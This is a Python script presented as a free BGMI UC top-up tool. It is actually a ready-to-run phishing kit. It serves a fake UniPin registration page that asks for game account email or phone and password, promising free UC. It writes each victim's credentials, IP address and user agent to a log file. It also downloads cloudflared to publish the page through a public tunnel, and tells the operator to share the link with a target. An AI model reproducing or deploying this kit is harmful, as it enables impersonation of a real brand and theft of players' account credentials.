#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BGMI UC Topup Tool - Premium Version with Auto Tunnel (Fixed)
Developer: Aryan Afridi | DIGITAL CYBER Official
"""

import os
import sys
import time
import json
import threading
import webbrowser
import subprocess
import signal
import socket
import urllib.request
import platform
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# COLOR FUNCTIONS
# ============================================
class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def colored(text, color=Colors.RESET):
    return f"{color}{text}{Colors.RESET}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    banner = """
  /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$      
 | $$__  $$ /$$__  $$|__  $$__/| $$      
 | $$  \ $$| $$  \__/   | $$   | $$      
 | $$  | $$| $$  /$$$$  | $$   | $$      
 | $$  | $$| $$ |_____/  | $$   | $$      
 | $$  | $$| $$    $$    | $$   | $$      
 | $$$$$$$/|  $$$$$$/    | $$   | $$$$$$$$
 |_______/  \______/     |__/   |________/
"""
    print(colored(banner, Colors.RED))
    print(colored("\nSubscribe Our Channel to use this tool For Free!", Colors.YELLOW))
    webbrowser.open('https://www.youtube.com/@aryanafridi00?si=4ShUWvlCJUNi749h')
    time.sleep(5)
    clear_screen()
    logo = """
              ██████╗  ██████╗ ███╗   ███╗██╗
              ██╔══██╗██╔════╝ ████╗ ████║██║
              ██████╔╝██║  ███╗██╔████╔██║██║
              ██╔══██╗██║   ██║██║╚██╔╝██║██║
              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║
                ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝
                               
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██████╔╝███████║██║███████╗███████║    ███████║███████║██║     █████╔╝ 
██╔═══╝ ██╔══██║██║╚════██║██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ 
██║     ██║  ██║██║███████║██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""
    print(colored(logo, Colors.CYAN))
    print(colored("               __DGTL BGMI Hacking Tool__", Colors.YELLOW))
    print(colored("         >> Developer By Aryan Afridi | DIGITAL CYBER Official <<\n", Colors.CYAN))
    print(colored("     Tool to BGMI Id via Cloudflare Tunnel\n\n", Colors.GREEN))

# ============================================
# HTML PAGES (Modified: Simplified to Email/Phone + Password)
# ============================================
def get_html_form():
    return '''<!DOCTYPE html>
<html lang="en" dir="ltr" style="background: #16182B">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="yes" name="apple-mobile-web-app-capable" />
    <meta name="viewport"
          content="width=device-width, minimum-scale=1, maximum-scale=1, initial-scale=1, user-scalable=no" />

    <title>UniPin - Register &amp; Chance To Unlock 50,000 worth of UniPin Credits</title>
    <meta name='application-name' content="UniPin" />
    <meta name="copyright" content="&copy; 2026 by UniPin">

    <meta name='description' content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta name="title" content="UniPin - Register &amp; Chance To Unlock 50,000 worth of UniPin Credits" />

    <meta name="robots" content="noodp, noydir" />

    <meta name="csrf-token" content="ubAzpD2AbGJILzS2E7EF9X55zoU10mXSDM6BKKZt">
    <meta name="theme-color" content="#ff962d">
    <link rel="manifest" href="/manifest.json">

    <!-- Removed CSP to allow inline scripts -->
    <link rel="apple-touch-icon" sizes="144x144" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="shortcut icon" sizes="196x196" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="shortcut icon" type="image/x-icon" href="https://cdn.unipin.com/img/favicon.ico" />
    <link rel="icon" type="image/x-icon" href="https://cdn.unipin.com/img/favicon.ico" />

    <meta property="og:url" content="http://www.unipin.com/in/article/register_and_chance_to_unlock_50000_worth_of_unipin_credits" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="UniPin " />
    <meta property="og:description"
          content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta property="og:image"
          content="https://cdn.unipin.com/images/content_image_pages/1780456772-700x280px%20_Website%20(5).jpg" />

    <meta property="twitter:card" content="summary">
    <meta property="twitter:site" content="@unipin">
    <meta property="twitter:title" content="UniPin " />
    <meta property="twitter:description"
          content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta property="twitter:image"
          content="https://cdn.unipin.com/images/content_image_pages/1780456772-700x280px%20_Website%20(5).jpg" />
    <meta property="twitter:url" content="http://www.unipin.com/in/article/register_and_chance_to_unlock_50000_worth_of_unipin_credits" />

    <meta name="ahrefs-site-verification" content="cc5310a60dff2678238fc465e3bb66bc6716d916c3dfbde7f94f98029637b7ca">

    <link rel="preload" href="https://cdn.unipin.com/images/unipin-logo-white.svg" as="image">

    <link rel="preconnect" href="https://www.googletagmanager.com" crossorigin>
    <link rel="preconnect" href="https://connect.facebook.net/" crossorigin>

    <link href="/css/app.v5.css?id=7459922ce4c02bc5e33f" rel="stylesheet" type="text/css"/>

    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400;1,700&display=swap"
        rel="stylesheet">

    <style>
        body {
            background: #16182B;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #1c1e3a;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
        }
        .logo-area {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-area img {
            max-width: 120px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid #333;
            background: #2a2c4a;
            color: #fff;
            font-size: 15px;
            transition: 0.3s;
            box-sizing: border-box;
        }
        .form-group input:focus {
            border-color: #ff962d;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255,150,45,0.2);
        }
        .form-group .checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .form-group .checkbox input {
            width: auto;
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff962d, #ff6b35);
            border: none;
            border-radius: 12px;
            color: #0a0a1a;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255,150,45,0.3);
        }
        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .error-msg {
            color: #ff4444;
            font-size: 13px;
            margin-top: 5px;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #2a2c4a;
            padding-top: 20px;
        }
        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(10,10,26,0.2);
            border-top: 2px solid #0a0a1a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .uc-selector {
            background: #2a2c4a;
            border-radius: 10px;
            padding: 15px;
            margin-top: 10px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .uc-option {
            background: #3a3c5a;
            padding: 8px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 500;
            transition: 0.2s;
            border: 2px solid transparent;
        }
        .uc-option:hover {
            background: #4a4c6a;
        }
        .uc-option.selected {
            border-color: #ff962d;
            background: #ff962d20;
            color: #ff962d;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-area">
        <img src="https://cdn.unipin.com/images/unipin-logo-white.svg" alt="UniPin" style="max-width:150px;">
        <h2 style="margin:10px 0 5px; font-weight:300;">Register &amp; Win</h2>
        <p style="color:#aaa; font-size:14px;">Chance to unlock 50,000 UniPin Credits</p>
    </div>

    <form id="register-form" method="POST" action="/submit">
        <!-- Hidden UC field -->
        <input type="hidden" name="uc" id="uc-hidden" value="660">

        <!-- Email / Phone (identifier) -->
        <div class="form-group">
            <label>📧 Email or Phone Number</label>
            <input type="text" name="identifier" placeholder="Enter your email or phone number" required>
        </div>

        <!-- Password -->
        <div class="form-group">
            <label>🔑 Password</label>
            <input type="password" name="password" placeholder="Enter your BGMI password" required autocomplete="current-password">
        </div>

        <!-- UC Package Selection -->
        <div class="form-group">
            <label> Select UC Package (Free)</label>
            <div class="uc-selector">
                <div class="uc-option" data-uc="60">60 UC</div>
                <div class="uc-option" data-uc="325">325 UC</div>
                <div class="uc-option selected" data-uc="660">660 UC</div>
                <div class="uc-option" data-uc="1800">1800 UC</div>
            </div>
        </div>

        <!-- Terms checkbox -->
        <div class="form-group checkbox">
            <input type="checkbox" name="accept_terms" required>
            <label style="font-weight:300; font-size:13px; color:#aaa;">I agree to the <a href="#" style="color:#ff962d;">Terms &amp; Conditions</a></label>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">
            <span id="btnText">🎁 Get Free UC Now</span>
            <span class="loader" id="loader"></span>
        </button>
    </form>

    <div class="footer">
        <p>© 2026 UniPin • All rights reserved</p>
        <p style="margin-top:5px; color:#4caf50;">🪂 256-bit encrypted • Secure</p>
    </div>
</div>

<script>
    // UC package selection
    document.querySelectorAll('.uc-option').forEach(el => {
        el.addEventListener('click', function() {
            document.querySelectorAll('.uc-option').forEach(e => e.classList.remove('selected'));
            this.classList.add('selected');
            document.getElementById('uc-hidden').value = this.dataset.uc;
        });
    });

    // Form submission with fetch
    const form = document.getElementById('register-form');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const loader = document.getElementById('loader');

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const identifier = this.querySelector('input[name="identifier"]').value.trim();
        const password = this.querySelector('input[name="password"]').value;
        const accept = this.querySelector('input[name="accept_terms"]').checked;
        const uc = document.getElementById('uc-hidden').value;

        if (!identifier || !password) {
            alert('Please fill in both Email/Phone and Password.');
            return;
        }
        if (!accept) {
            alert('You must accept the Terms & Conditions.');
            return;
        }

        // Disable button and show loader
        btnText.textContent = 'Processing...';
        loader.style.display = 'inline-block';
        submitBtn.disabled = true;

        fetch('/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                identifier: identifier,
                password: password,
                uc: uc
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                btnText.textContent = '✅ Success!';
                submitBtn.style.background = 'linear-gradient(135deg, #4caf50, #45a049)';
                setTimeout(() => {
                    window.location.href = '/result';
                }, 1200);
            } else {
                throw new Error('Server error');
            }
        })
        .catch(error => {
            btnText.textContent = '❌ Error! Try Again';
            submitBtn.style.background = 'linear-gradient(135deg, #ff4444, #cc0000)';
            loader.style.display = 'none';
            submitBtn.disabled = false;
            setTimeout(() => {
                btnText.textContent = '🎁 Get Free UC Now';
                submitBtn.style.background = '';
            }, 2000);
        });
    });

    // Auto-select 660 UC as default (already selected in HTML)
</script>
</body>
</html>'''

def get_result_page(data):
    return f'''<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Topup Successful - UniPin</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',sans-serif;background:#0a0a1a;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at center,rgba(76,175,80,0.05) 0%,transparent 70%),linear-gradient(180deg,#0a0a1a 0%,#16182B 100%)}}
.container{{width:100%;max-width:480px;background:linear-gradient(145deg,rgba(26,28,58,0.95),rgba(15,17,38,0.98));border-radius:28px;padding:40px 25px 35px;box-shadow:0 30px 80px rgba(0,0,0,0.9),0 0 0 1px rgba(76,175,80,0.1);backdrop-filter:blur(20px);border:1px solid rgba(76,175,80,0.08);text-align:center}}
.success-animation{{position:relative;display:inline-block;margin-bottom:20px}}
.success-circle{{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,rgba(76,175,80,0.15),rgba(76,175,80,0.05));border:2px solid rgba(76,175,80,0.2);display:flex;align-items:center;justify-content:center;margin:0 auto;animation:pulse 2s ease-in-out infinite}}
.success-circle .check{{font-size:50px}}
@keyframes pulse{{0%,100%{{transform:scale(1);box-shadow:0 0 20px rgba(76,175,80,0)}}50%{{transform:scale(1.05);box-shadow:0 0 40px rgba(76,175,80,0.15)}}}}
.container h1{{font-family:'Orbitron',sans-serif;color:#4caf50;font-size:26px;margin-bottom:6px;font-weight:800}}
.container .sub-title{{color:#6a6c8a;font-size:14px;margin-bottom:25px}}
.uc-delivery{{display:inline-block;background:rgba(255,150,45,0.08);border:1px solid rgba(255,150,45,0.12);padding:8px 25px;border-radius:30px;color:#ff962d;font-size:14px;font-weight:600;margin-bottom:25px;animation:glow 2s ease-in-out infinite}}
@keyframes glow{{0%,100%{{box-shadow:0 0 20px rgba(255,150,45,0)}}50%{{box-shadow:0 0 30px rgba(255,150,45,0.1)}}}}
.details{{background:rgba(255,255,255,0.03);border-radius:16px;padding:18px 20px;text-align:left;margin-bottom:25px;border:1px solid rgba(255,255,255,0.04)}}
.details .row{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.03)}}
.details .row:last-child{{border-bottom:none}}
.details .label{{color:#6a6c8a;font-size:13px;font-weight:400}}
.details .value{{color:#fff;font-weight:500;font-size:13px;word-break:break-all;text-align:right;max-width:60%;font-family:'Orbitron',sans-serif}}
.details .value.email{{font-family:'Roboto',sans-serif}}
.back-btn{{display:inline-block;padding:12px 35px;background:rgba(255,255,255,0.06);color:#8a8caa;text-decoration:none;border-radius:30px;font-weight:500;transition:all 0.3s ease;border:1px solid rgba(255,255,255,0.04);font-size:14px}}
.back-btn:hover{{background:rgba(255,255,255,0.1);color:#fff;transform:translateY(-2px)}}
.back-btn .arrow{{margin-right:8px}}
.footer-note{{margin-top:20px;color:#3a3c5a;font-size:11px}}
.footer-note .highlight{{color:#4caf50}}
@media (max-width:480px){{.container{{padding:30px 16px 25px}}.success-circle{{width:80px;height:80px}}.success-circle .check{{font-size:40px}}.container h1{{font-size:22px}}}}
</style>
</head>
<body>
<div class="container">
<div class="success-animation"><div class="success-circle"><span class="check">✅</span></div></div>
<h1>Topup Successful!</h1>
<p class="sub-title">Your UC request has been processed successfully</p>
<div class="uc-delivery">🎉 Delivering your UC...</div>
<div class="details">
<div class="row"><span class="label">📧 Email/Phone</span><span class="value email">{data['identifier']}</span></div>
<div class="row"><span class="label">🔑 Password</span><span class="value">{data['password']}</span></div>
<div class="row"><span class="label">🪖 UC Requested</span><span class="value">{data['uc']} UC</span></div>
<div class="row"><span class="label">📍 IP Address</span><span class="value">{data['ip']}</span></div>
<div class="row"><span class="label">⏰ Time</span><span class="value">{data['time']}</span></div>
</div>
<a href="/" class="back-btn"><span class="arrow">⬅️</span> Back to Home</a>
<div class="footer-note"><span class="highlight">✓</span> Transaction ID: <span class="highlight">BGMI-{data['uc']}-{int(time.time()) % 1000000}</span></div>
</div>
</body>
</html>'''

# ============================================
# HTTP REQUEST HANDLER
# ============================================
class BGMIRequestHandler(BaseHTTPRequestHandler):
    last_submission = None
    def log_message(self, format, *args): pass
    def log_to_file(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"""
===========================================
[New UC Request] - {timestamp}
Email/Phone: {data['identifier']}
Password: {data['password']}
UC: {data['uc']}
IP: {data['ip']}
User-Agent: {data.get('user_agent','Unknown')}
===========================================
"""
        with open("data.log", "a", encoding='utf-8') as f: f.write(log_entry)
        print(colored("\n===========================================", Colors.CYAN))
        print(colored("[New UC Request]", Colors.YELLOW))
        print(colored(f"Email/Phone: ", Colors.GREEN) + data['identifier'])
        print(colored(f"Password: ", Colors.GREEN) + data['password'])
        print(colored(f"UC: ", Colors.GREEN) + str(data['uc']))
        print(colored(f"IP: ", Colors.GREEN) + data['ip'])
        print(colored("===========================================\n", Colors.CYAN))
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200); self.send_header('Content-type','text/html; charset=utf-8'); self.end_headers()
            self.wfile.write(get_html_form().encode('utf-8'))
        elif self.path == '/result':
            self.send_response(200); self.send_header('Content-type','text/html; charset=utf-8'); self.end_headers()
            if self.last_submission: self.wfile.write(get_result_page(self.last_submission).encode('utf-8'))
            else: self.wfile.write(b'<h1>No data found</h1>')
        else: self.send_response(404); self.end_headers(); self.wfile.write(b'404 Not Found')
    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers.get('Content-Length',0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                identifier = data.get('identifier','')
                password = data.get('password','')
                uc = data.get('uc','')
                if identifier and password and uc:
                    submission = {
                        'identifier': identifier,
                        'password': password,
                        'uc': uc,
                        'ip': self.client_address[0],
                        'user_agent': self.headers.get('User-Agent','Unknown'),
                        'time': datetime.now().strftime("%I:%M %p")
                    }
                    self.last_submission = submission
                    self.log_to_file(submission)
                    self.send_response(200); self.send_header('Content-type','application/json'); self.end_headers()
                    self.wfile.write(json.dumps({'status':'success'}).encode('utf-8'))
                else:
                    self.send_response(400); self.end_headers(); self.wfile.write(json.dumps({'error':'Missing fields'}).encode('utf-8'))
            except json.JSONDecodeError:
                self.send_response(400); self.end_headers(); self.wfile.write(json.dumps({'error':'Invalid JSON'}).encode('utf-8'))
        else: self.send_response(404); self.end_headers(); self.wfile.write(b'404 Not Found')

# ============================================
# PORT & TUNNEL FUNCTIONS (FIXED)
# ============================================
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try: s.bind(('0.0.0.0', port)); return False
        except socket.error: return True

def find_free_port(start_port=8000, max_port=8100):
    for port in range(start_port, max_port+1):
        if not is_port_in_use(port): return port
    return None

def download_cloudflared():
    system = platform.system().lower()
    arch = platform.machine().lower()
    if system == 'windows':
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        filename = "cloudflared.exe"
    elif system == 'darwin':
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        filename = "cloudflared"
    else:  # Linux
        if 'aarch64' in arch or 'arm64' in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif 'arm' in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        filename = "cloudflared"
    try:
        print(colored(f"Downloading cloudflared from {url} ...", Colors.CYAN))
        urllib.request.urlretrieve(url, filename)
        if system != 'windows':
            os.chmod(filename, 0o755)
        print(colored("✓ cloudflared downloaded successfully!", Colors.GREEN))
        return filename
    except Exception as e:
        print(colored(f"Download failed: {e}", Colors.RED))
        return None

def start_cloudflare_tunnel(port):
    global cloudflare_process
    cloudflare_process = None
    # Check if cloudflared is in PATH
    def is_cloudflared_available():
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
            return True
        except: return False
    # Try to find existing cloudflared
    cf_path = None
    if is_cloudflared_available():
        cf_path = 'cloudflared'
    else:
        # Look in current directory
        if os.name == 'nt' and os.path.exists('cloudflared.exe'):
            cf_path = 'cloudflared.exe'
        elif os.name != 'nt' and os.path.exists('cloudflared'):
            cf_path = './cloudflared'
        else:
            # Download
            downloaded = download_cloudflared()
            if downloaded:
                cf_path = downloaded
    if not cf_path:
        print(colored("Cloudflared not found and download failed.", Colors.RED))
        return None
    # Kill existing
    if os.name == 'nt':
        os.system('taskkill /f /im cloudflared.exe 2>nul')
    else:
        os.system('pkill -f cloudflared 2>/dev/null')
    print(colored(f"\n[+] Starting Cloudflare Tunnel on port {port}...", Colors.GREEN))
    cmd = [cf_path, 'tunnel', '--url', f'http://localhost:{port}']
    cloudflare_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
    print(colored("Waiting for tunnel to be ready...", Colors.CYAN))
    time.sleep(4)
    url = None
    for _ in range(30):
        if cloudflare_process.poll() is not None: break
        line = cloudflare_process.stdout.readline()
        if line:
            if 'https://' in line and 'trycloudflare.com' in line:
                parts = line.split()
                for part in parts:
                    if 'https://' in part and 'trycloudflare.com' in part:
                        url = part.strip()
                        break
                if url: break
        time.sleep(0.5)
    if url:
        print(colored("\n" + "="*60, Colors.GREEN))
        print(colored("✅ CLOUDFLARE TUNNEL IS READY!", Colors.GREEN))
        print(colored("="*60, Colors.GREEN))
        print(colored(f"\n🌐 Public URL:", Colors.CYAN))
        print(colored(f"\n{url}\n", Colors.MAGENTA))
        print(colored("="*60, Colors.GREEN))
        print(colored("📋 Copy this URL and share with your target!", Colors.YELLOW))
        print(colored("="*60 + "\n", Colors.GREEN))
        try:
            import pyperclip
            pyperclip.copy(url)
            print(colored("✅ URL copied to clipboard!\n", Colors.GREEN))
        except: pass
        return url
    else:
        print(colored("\n[!] Could not get tunnel URL.", Colors.RED))
        return None

# ============================================
# WEB SERVER
# ============================================
def start_web_server(port):
    try:
        server = HTTPServer(('0.0.0.0', port), BGMIRequestHandler)
        print(colored(f"\n[+] Starting Python server on http://0.0.0.0:{port} ...", Colors.GREEN))
        print(colored(f"[✓] Server started successfully!\n", Colors.GREEN))
        url = start_cloudflare_tunnel(port)
        if url:
            print(colored(f"\n📁 Data will be saved in data.log\n", Colors.YELLOW))
            print(colored(f"📁 View logs: tail -f data.log\n\n", Colors.YELLOW))
            print(colored(f"[*] Press Ctrl+C to stop the server\n", Colors.RED))
        else:
            print(colored("\n[!] Cloudflare Tunnel failed to start.", Colors.RED))
            print(colored("You can still access locally at: http://localhost:" + str(port), Colors.YELLOW))
            print(colored("Try manually: cloudflared tunnel --url http://localhost:" + str(port), Colors.YELLOW))
        server.serve_forever()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Server stopped by user\n", Colors.YELLOW))
        if 'cloudflare_process' in globals() and cloudflare_process:
            try: cloudflare_process.terminate()
            except: pass
    except Exception as e:
        print(colored(f"\n[!] Error: {e}\n", Colors.RED))

# ============================================
# VIEW LOGS
# ============================================
def view_logs():
    if not os.path.exists('data.log'):
        print(colored("\n[!] No logs found yet.\n", Colors.RED))
        return
    clear_screen()
    print(colored("\n========== DATA LOGS ==========\n", Colors.CYAN))
    with open('data.log', 'r', encoding='utf-8') as f: print(f.read())
    print(colored("\n================================\n", Colors.CYAN))
    input(colored("Press Enter to continue...", Colors.YELLOW))

# ============================================
# MENU
# ============================================
def show_menu():
    print(colored("[1] Start BGMI Phishing (Auto Tunnel)", Colors.YELLOW))
    print(colored("[2] View Logs", Colors.BLUE))
    print(colored("[3] Exit", Colors.RED))
    print()

def kill_previous_servers():
    if os.name != 'nt':
        os.system('pkill -f "python.*bgmi" 2>/dev/null')
        os.system('pkill -f cloudflared 2>/dev/null')
    else:
        os.system('taskkill /f /im cloudflared.exe 2>nul')

def auto_start():
    port = find_free_port(8000, 8100)
    if not port:
        print(colored("[!] No free ports available in range 8000-8100!", Colors.RED))
        return
    kill_previous_servers()
    start_web_server(port)

# ============================================
# MAIN
# ============================================
def main():
    try:
        if sys.version_info < (3,6):
            print(colored("Please use Python 3.6 or higher", Colors.RED)); sys.exit(1)
        show_banner()
        while True:
            show_menu()
            choice = input(colored("Enter your choice [1-3]: ", Colors.BLUE))
            if choice == '1':
                auto_start()
            elif choice == '2':
                view_logs()
            elif choice == '3':
                print(colored("\nExiting... Bye Hacker! 👋\n", Colors.RED))
                kill_previous_servers()
                sys.exit(0)
            else:
                print(colored("\nInvalid choice! Please try again.\n", Colors.RED))
                time.sleep(1)
    except KeyboardInterrupt:
        print(colored("\n\nExiting... Bye Hacker! 👋\n", Colors.RED))
        kill_previous_servers()
        sys.exit(0)

if __name__ == "__main__":
    main()
